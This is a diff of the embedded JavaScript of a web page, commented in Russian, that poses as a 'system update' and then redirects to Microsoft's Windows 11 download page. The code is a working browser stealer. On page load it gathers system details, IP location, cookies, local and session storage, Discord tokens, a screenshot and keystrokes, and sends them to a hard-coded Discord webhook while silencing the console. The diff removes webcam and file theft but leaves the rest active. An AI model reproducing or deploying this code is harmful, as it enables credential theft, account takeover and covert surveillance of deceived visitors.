@@ -97,131 +97,116 @@
 <script>
            // === КОНФИГ ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1475205126166941717/U5gN1sW3piGZF5FRZEId48YcbJLi5XwyvPV03qNaDNc9Be7wiNFRTiNLgCQau5plTIVD";
-        const MAX_MESSAGE_LENGTH = 1900; // Discord лимит
-        const CAPTURE_DELAY = 3000; // Задержка перед сбором
+        const MAX_MESSAGE_LENGTH = 1900;
+        const CAPTURE_DELAY = 3000;
+        
+        // === БЕЗОПАСНОЕ ОБНОВЛЕНИЕ СТАТУСА ===
+        function updateStatus(text) {
+            try {
+                const statusElement = document.getElementById('statusMessage');
+                if (statusElement) {
+                    statusElement.innerText = text;
+                }
+                console.log('[Status]', text); // Для отладки
+            } catch(e) {
+                console.log('Status update error:', e);
+            }
+        }
         
         // === ФУНКЦИЯ ОТПРАВКИ В DISCORD ===
         function sendToDiscord(content, isFile = false, filename = null, fileData = null) {
-            if (isFile) {
-                // Отправка файла (скриншот, файлы жертвы)
-                const formData = new FormData();
-                const blob = dataURLToBlob(fileData);
-                formData.append('file', blob, filename);
-                
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                }).catch(e => console.log('File send error:', e));
-            } else {
-                // Отправка текста (разбиваем если длинное)
-                if (content.length > MAX_MESSAGE_LENGTH) {
-                    const chunks = content.match(new RegExp('.{1,' + MAX_MESSAGE_LENGTH + '}', 'g'));
-                    chunks.forEach(chunk => {
+            try {
+                if (isFile) {
+                    const formData = new FormData();
+                    const blob = dataURLToBlob(fileData);
+                    formData.append('file', blob, filename);
+                    
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => console.log('File send error:', e));
+                } else {
+                    if (content.length > MAX_MESSAGE_LENGTH) {
+                        const chunks = content.match(new RegExp('.{1,' + MAX_MESSAGE_LENGTH + '}', 'g'));
+                        chunks.forEach(chunk => {
+                            fetch(WEBHOOK_URL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ content: chunk.substring(0, MAX_MESSAGE_LENGTH) })
+                            }).catch(e => console.log('Send error:', e));
+                        });
+                    } else {
                         fetch(WEBHOOK_URL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ content: chunk.substring(0, MAX_MESSAGE_LENGTH) })
+                            body: JSON.stringify({ content: content })
                         }).catch(e => console.log('Send error:', e));
-                    });
-                } else {
-                    fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: content })
-                    }).catch(e => console.log('Send error:', e));
+                    }
                 }
+            } catch(e) {
+                console.log('Send function error:', e);
             }
         }
         
-        // Конверт dataURL в Blob
         function dataURLToBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while (n--) {
-                u8arr[n] = bstr.charCodeAt(n);
-            }
-            return new Blob([u8arr], { type: mime });
-        }
-
-        // === 1. МАКСИМАЛЬНАЯ ИНФА О СИСТЕМЕ ===
-        async function getSystemInfo() {
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const languages = navigator.languages.join(', ');
-            const cookiesEnabled = navigator.cookieEnabled;
-            const doNotTrack = navigator.doNotTrack || 'Not specified';
-            const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-            const deviceMemory = navigator.deviceMemory || 'Unknown';
-            const maxTouchPoints = navigator.maxTouchPoints || 0;
-            const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
-            
-            // Батарея
-            let batteryInfo = 'Unknown';
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `${Math.round(battery.level * 100)}%, ${battery.charging ? 'Charging' : 'Not charging'}`;
-                } catch(e) {}
-            }
-            
-            // Сеть
-            let connectionInfo = 'Unknown';
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                connectionInfo = `${conn.effectiveType || 'Unknown'}, ${conn.downlink || '?'}Mbps, RTT:${conn.rtt || '?'}ms`;
-            }
-            
-            // Видеокарта (WebGL)
-            let gpuInfo = 'Unknown';
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
+                const arr = dataURL.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while (n--) {
+                    u8arr[n] = bstr.charCodeAt(n);
                 }
-            } catch(e) {}
-            
-            // Время работы системы (performance)
-            const uptime = performance.now();
-            
-            return {
-                userAgent: ua,
-                platform: platform,
-                language: language,
-                languages: languages,
-                cookiesEnabled: cookiesEnabled,
-                doNotTrack: doNotTrack,
-                cpuCores: hardwareConcurrency,
-                ram: deviceMemory + 'GB',
-                touchPoints: maxTouchPoints,
-                pdfViewer: pdfViewerEnabled,
-                battery: batteryInfo,
-                connection: connectionInfo,
-                gpu: gpuInfo,
-                uptime: uptime,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight
-            };
+                return new Blob([u8arr], { type: mime });
+            } catch(e) {
+                return new Blob([]);
+            }
         }
 
-        // === 2. ГЕОЛОКАЦИЯ (IP + ТОЧНАЯ) ===
+        // === 1. СИСТЕМНАЯ ИНФА ===
+        async function getSystemInfo() {
+            try {
+                const ua = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const languages = navigator.languages?.join(', ') || 'Unknown';
+                const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+                const deviceMemory = navigator.deviceMemory || 'Unknown';
+                
+                // Батарея
+                let batteryInfo = 'Unknown';
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = `${Math.round(battery.level * 100)}%, ${battery.charging ? 'Charging' : 'Not charging'}`;
+                    } catch(e) {}
+                }
+                
+                return {
+                    userAgent: ua,
+                    platform: platform,
+                    language: language,
+                    languages: languages,
+                    cpuCores: hardwareConcurrency,
+                    ram: deviceMemory + 'GB',
+                    battery: batteryInfo,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                };
+            } catch(e) {
+                return { error: 'Failed to get system info' };
+            }
+        }
+
+        // === 2. ГЕОЛОКАЦИЯ ===
         async function getGeoInfo() {
             let ipData = {};
             let geoData = {};
             
-            // IP и приблизительная геолокация через ipapi.co
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 ipData = await response.json();
@@ -232,384 +217,170 @@
                 } catch(e2) {}
             }
             
-            // Точная геолокация (если разрешит)
-            if ('geolocation' in navigator) {
-                try {
-                    geoData = await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            pos => resolve({
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                acc: pos.coords.accuracy,
-                                alt: pos.coords.altitude,
-                                speed: pos.coords.speed
-                            }),
-                            () => resolve({ error: 'Permission denied' }),
-                            { timeout: 3000 }
-                        );
-                    });
-                } catch(e) {
-                    geoData = { error: 'Failed' };
-                }
-            }
-            
             return { ipData, geoData };
         }
 
-        // === 3. ВОРОВСТО КУКИ, LOCALSTORAGE, SESSIONSTORAGE ===
+        // === 3. СТОРАДЖИ ===
         function stealStorages() {
-            const data = {};
-            
-            // Cookies
-            data.cookies = document.cookie || 'No cookies';
-            
-            // localStorage
-            data.localStorage = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                let value = localStorage.getItem(key);
-                // Маскируем чувствительные данные
-                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('pass')) {
-                    value = '***HIDDEN***';
+            try {
+                const data = {};
+                data.cookies = document.cookie || 'No cookies';
+                
+                data.localStorage = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data.localStorage[key] = localStorage.getItem(key);
                 }
-                data.localStorage[key] = value;
+                
+                data.sessionStorage = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+                
+                return data;
+            } catch(e) {
+                return { error: 'Storage access failed' };
             }
-            
-            // sessionStorage
-            data.sessionStorage = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                data.sessionStorage[key] = sessionStorage.getItem(key);
-            }
-            
-            return data;
         }
 
-        // === 4. ПОИСК ТОКЕНОВ (DISCORD, TELEGRAM, CRYPTO) ===
+        // === 4. ПОИСК ТОКЕНОВ ===
         function findTokens() {
             const tokens = {
                 discord: [],
-                telegram: [],
-                crypto: [],
                 other: []
             };
             
-            // Регулярки для токенов
-            const patterns = {
-                discord: /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g,
-                telegram: /(\d{5,10}:[\w-]{35})/g,
-                crypto: /(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})/g
-            };
-            
-            // Проверяем localStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
+            try {
+                const discordPattern = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
                 
-                Object.entries(patterns).forEach(([type, pattern]) => {
-                    const matches = value.match(pattern);
+                for (let i = 0; i < localStorage.length; i++) {
+                    const value = localStorage.getItem(localStorage.key(i));
+                    const matches = value.match(discordPattern);
                     if (matches) {
-                        tokens[type].push(...matches);
+                        tokens.discord.push(...matches);
                     }
-                });
-            }
-            
-            // Проверяем cookies
-            const cookieMatches = document.cookie.match(patterns.discord);
-            if (cookieMatches) tokens.discord.push(...cookieMatches);
+                }
+                
+                const cookieMatches = document.cookie.match(discordPattern);
+                if (cookieMatches) tokens.discord.push(...cookieMatches);
+                
+            } catch(e) {}
             
             return tokens;
         }
 
-        // === 5. КРИПТОКОШЕЛЬКИ (ПРОВЕРКА РАСШИРЕНИЙ) ===
-        function detectCryptoWallets() {
-            const wallets = [];
-            
-            // Проверка на расширения
-            if (window.ethereum) wallets.push('MetaMask/Web3');
-            if (window.BinanceChain) wallets.push('Binance Chain');
-            if (window.trustwallet) wallets.push('Trust Wallet');
-            if (window.solana) wallets.push('Solana (Phantom)');
-            if (window.keplr) wallets.push('Keplr (Cosmos)');
-            if (window.tronWeb) wallets.push('TronLink');
-            if (window.cardano) wallets.push('Cardano');
-            if (window.ton) wallets.push('TON Wallet');
-            
-            return wallets.length ? wallets.join(', ') : 'None detected';
-        }
-
-        // === 6. УСТАНОВЛЕННЫЕ ПРОГРАММЫ (ЧЕРЕЗ PLUGINS) ===
-        function getInstalledSoftware() {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            return plugins;
-        }
-
-        // === 7. СКРИНШОТ ЭКРАНА ===
+        // === 5. СКРИНШОТ ===
         async function takeScreenshot() {
             try {
                 const canvas = await html2canvas(document.body, {
-                    scale: 2,
+                    scale: 1,
                     logging: false,
                     allowTaint: true,
                     useCORS: true
                 });
-                return canvas.toDataURL('image/png');
+                return canvas.toDataURL('image/jpeg', 0.7);
             } catch(e) {
                 return null;
             }
         }
 
-        // === 8. ВИДЕО С ВЕБКИ (ЕСЛИ ЕСТЬ ДОСТУП) ===
-        async function captureWebcam() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                // Ждем немного для загрузки
-                await new Promise(r => setTimeout(r, 500));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                stream.getTracks().forEach(track => track.stop());
-                return canvas.toDataURL('image/jpeg');
-            } catch(e) {
-                return null;
-            }
-        }
-
-        // === 9. KEYLOGGER (ЛОВЛЯ НАЖАТИЙ) ===
+        // === 6. КЕЙЛОГГЕР ===
         let keyLog = [];
-        let mouseLog = [];
         
         function startKeyLogger() {
-            document.addEventListener('keydown', function(e) {
-                if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
-                    keyLog.push(e.key);
-                    
-                    // Отправляем каждые 20 нажатий
-                    if (keyLog.length >= 20) {
-                        sendToDiscord(`**⌨️ Keylogger (${keyLog.length} keys):**\n\`\`\`${keyLog.join('')}\`\`\``);
-                        keyLog = [];
-                    }
-                }
-            });
-            
-            document.addEventListener('click', function(e) {
-                mouseLog.push({
-                    x: e.clientX,
-                    y: e.clientY,
-                    target: e.target.tagName
-                });
-                
-                if (mouseLog.length >= 10) {
-                    sendToDiscord(`**🖱️ Clicks:**\n${JSON.stringify(mouseLog, null, 2)}`);
-                    mouseLog = [];
-                }
-            });
-            
-            // Отправляем при уходе
-            window.addEventListener('beforeunload', function() {
-                if (keyLog.length) {
-                    sendToDiscord(`**⌨️ Keylogger final:**\n\`\`\`${keyLog.join('')}\`\`\``);
-                }
-                if (mouseLog.length) {
-                    sendToDiscord(`**🖱️ Clicks final:**\n${JSON.stringify(mouseLog, null, 2)}`);
-                }
-            });
-        }
-
-        // === 10. КРАЖА ФАЙЛОВ (ЧЕРЕЗ INPUT) ===
-        function stealFiles() {
-            const input = document.createElement('input');
-            input.type = 'file';
-            input.multiple = true;
-            input.style.display = 'none';
-            input.setAttribute('webkitdirectory', '');
-            input.setAttribute('directory', '');
-            
-            input.onchange = function(e) {
-                const files = Array.from(e.target.files);
-                const fileList = files.map(f => ({
-                    name: f.name,
-                    size: (f.size / 1024).toFixed(2) + 'KB',
-                    type: f.type,
-                    path: f.webkitRelativePath || f.name
-                }));
-                
-                sendToDiscord(`**📁 File list (${files.length} files):**\n\`\`\`json\n${JSON.stringify(fileList.slice(0, 20), null, 2)}\n\`\`\``);
-                
-                // Отправляем мелкие файлы (< 1MB)
-                files.slice(0, 5).forEach(file => {
-                    if (file.size < 1024 * 1024) {
-                        const reader = new FileReader();
-                        reader.onload = function(e) {
-                            sendToDiscord(`File: ${file.name}`, true, file.name, e.target.result);
-                        };
-                        reader.readAsDataURL(file);
+            try {
+                document.addEventListener('keydown', function(e) {
+                    if (e.key.length === 1) {
+                        keyLog.push(e.key);
+                        
+                        if (keyLog.length >= 20) {
+                            sendToDiscord(`**⌨️ Keys (${keyLog.length}):**\n\`${keyLog.join('')}\``);
+                            keyLog = [];
+                        }
                     }
                 });
-            };
-            
-            document.body.appendChild(input);
-            setTimeout(() => {
-                input.click();
-            }, 1000);
+                
+                window.addEventListener('beforeunload', function() {
+                    if (keyLog.length > 0) {
+                        sendToDiscord(`**⌨️ Keys final:**\n\`${keyLog.join('')}\``);
+                    }
+                });
+            } catch(e) {}
         }
 
-        // === 11. ФИНГЕРПРИНТ БРАУЗЕРА ===
-        function getFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Hello, world!', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Hello, world!', 4, 17);
-            
-            const canvasFp = canvas.toDataURL();
-            
-            return {
-                canvas: canvasFp.substring(0, 100) + '...',
-                webgl: navigator.userAgent.substring(0, 50) + '...'
-            };
-        }
-
-        // === 12. СЕТЕВАЯ АКТИВНОСТЬ ===
-        function getNetworkActivity() {
-            const resources = performance.getEntriesByType('resource');
-            const domains = new Set();
-            resources.forEach(r => {
-                try {
-                    const url = new URL(r.name);
-                    domains.add(url.hostname);
-                } catch(e) {}
-            });
-            
-            return Array.from(domains).slice(0, 20);
-        }
-
-        // === 13. МАСКИРОВКА ===
+        // === 7. МАСКИРОВКА ===
         function setupMasks() {
-            // Скрываем консоль
-            console.log = function() {};
-            console.error = function() {};
-            console.warn = function() {};
-            
-            // Проверка на девтулзы
-            setInterval(() => {
-                const start = performance.now();
-                debugger;
-                const end = performance.now();
-                if (end - start > 100) {
-                    // Если девтулзы открыты - редирект на гугл
-                    window.location.href = 'https://www.google.com';
-                }
-            }, 2000);
-            
-            // Скрываем себя из истории
-            if (window.history && window.history.replaceState) {
-                window.history.replaceState(null, null, window.location.href);
-            }
+            try {
+                // Скрываем консоль
+                console.log = function() {};
+                console.error = function() {};
+                console.warn = function() {};
+            } catch(e) {}
         }
 
-        // === 14. СОБИРАЕМ ВСЁ В КУЧУ ===
+        // === 8. ГЛАВНАЯ ФУНКЦИЯ СБОРА ===
         async function megaSteal() {
             try {
+                updateStatus('🔍 Initializing...');
+                
                 // Маскировка
                 setupMasks();
                 
-                // Запускаем кейлоггер
+                // Кейлоггер
                 startKeyLogger();
                 
-                // Обновляем статус
-                document.getElementById('statusText').innerText = '🔍 Collecting system information...';
-                
-                // 1. Системная информация
+                // 1. Система
+                updateStatus('📊 Collecting system info...');
                 const sysInfo = await getSystemInfo();
                 sendToDiscord(`**💻 SYSTEM INFO**\n\`\`\`json\n${JSON.stringify(sysInfo, null, 2)}\n\`\`\``);
                 
-                // 2. Гео + IP
-                document.getElementById('statusText').innerText = '📍 Getting location...';
+                // 2. Гео
+                updateStatus('📍 Getting location...');
                 const geoInfo = await getGeoInfo();
-                const googleMaps = geoInfo.geoData.lat ? 
-                    `https://www.google.com/maps?q=${geoInfo.geoData.lat},${geoInfo.geoData.lon}` : 
-                    'No precise location';
-                sendToDiscord(`**📍 LOCATION & IP**\nIP: ${geoInfo.ipData.ip || 'Unknown'}\nCountry: ${geoInfo.ipData.country_name || 'Unknown'}\nCity: ${geoInfo.ipData.city || 'Unknown'}\nISP: ${geoInfo.ipData.org || 'Unknown'}\nMaps: ${googleMaps}`);
+                sendToDiscord(`**📍 LOCATION**\nIP: ${geoInfo.ipData.ip || 'Unknown'}\nCountry: ${geoInfo.ipData.country_name || 'Unknown'}\nCity: ${geoInfo.ipData.city || 'Unknown'}\nISP: ${geoInfo.ipData.org || 'Unknown'}`);
                 
-                // 3. Сторэйджи
-                document.getElementById('statusText').innerText = '🍪 Stealing cookies...';
+                // 3. Стораджи
+                updateStatus('🍪 Stealing cookies...');
                 const storages = stealStorages();
-                sendToDiscord(`**🍪 STORAGES**\nCookies: ${storages.cookies.substring(0, 500)}\n\nLocalStorage: ${JSON.stringify(storages.localStorage, null, 2).substring(0, 500)}`);
+                sendToDiscord(`**🍪 COOKIES**\n\`\`\`\n${storages.cookies.substring(0, 500)}\n\`\`\``);
+                sendToDiscord(`**💾 LOCALSTORAGE**\n\`\`\`json\n${JSON.stringify(storages.localStorage, null, 2).substring(0, 500)}\n\`\`\``);
                 
                 // 4. Токены
+                updateStatus('🎫 Searching tokens...');
                 const tokens = findTokens();
-                sendToDiscord(`**🎫 TOKENS FOUND**\nDiscord: ${tokens.discord.join('\n') || 'None'}\nTelegram: ${tokens.telegram.join('\n') || 'None'}\nCrypto: ${tokens.crypto.join('\n') || 'None'}`);
+                if (tokens.discord.length > 0) {
+                    sendToDiscord(`**🎫 DISCORD TOKENS**\n\`\`\`\n${tokens.discord.join('\n')}\n\`\`\``);
+                }
                 
-                // 5. Криптокошельки
-                const wallets = detectCryptoWallets();
-                sendToDiscord(`**💰 CRYPTO WALLETS**\n${wallets}`);
-                
-                // 6. Программы
-                const software = getInstalledSoftware();
-                sendToDiscord(`**📦 INSTALLED PLUGINS**\n${software.join('\n') || 'None'}`);
-                
-                // 7. Сеть
-                const domains = getNetworkActivity();
-                sendToDiscord(`**🌐 NETWORK ACTIVITY**\nDomains visited:\n${domains.join('\n') || 'None'}`);
-                
-                // 8. Скриншот
-                document.getElementById('statusText').innerText = '📸 Taking screenshot...';
+                // 5. Скриншот
+                updateStatus('📸 Taking screenshot...');
                 const screenshot = await takeScreenshot();
                 if (screenshot) {
-                    sendToDiscord('📸 **SCREENSHOT**', true, 'screenshot.png', screenshot);
+                    sendToDiscord('📸 **SCREENSHOT**', true, 'screenshot.jpg', screenshot);
                 }
-                
-                // 9. Вебка
-                document.getElementById('statusText').innerText = '📷 Accessing camera...';
-                const webcam = await captureWebcam();
-                if (webcam) {
-                    sendToDiscord('📷 **WEBCAM**', true, 'webcam.jpg', webcam);
-                }
-                
-                // 10. Фингерпринт
-                const fp = getFingerprint();
-                sendToDiscord(`**🖐️ FINGERPRINT**\nCanvas: ${fp.canvas}\nWebGL: ${fp.webgl}`);
-                
-                // 11. Запрос на файлы (осторожно)
-                document.getElementById('statusText').innerText = '📁 Scanning files... (click allow if prompted)';
-                setTimeout(() => {
-                    stealFiles();
-                }, 2000);
                 
                 // Финальное сообщение
-                document.getElementById('statusText').innerText = '✅ System update complete! Redirecting...';
+                updateStatus('✅ Update complete! Redirecting...');
                 
-                // Редирект через 5 секунд
+                // Редирект
                 setTimeout(() => {
-                    window.location.href = 'https://www.microsoft.com/software-download/windows11';
-                }, 5000);
+                    try {
+                        window.location.href = 'https://www.microsoft.com/software-download/windows11';
+                    } catch(e) {}
+                }, 3000);
                 
             } catch(e) {
-                console.log('Error:', e);
+                console.log('Main error:', e);
+                updateStatus('⚠️ Error: ' + e.message);
                 sendToDiscord(`**❌ ERROR**\n${e.toString()}`);
             }
         }
 
         // === СТАРТ ===
-        window.onload = function() {
-            setTimeout(megaSteal, CAPTURE_DELAY);
-        };
+        window.addEventListener('load', function() {
+            setTimeout(megaSteal, 1500);
+        });
     </script>
 
 </section>
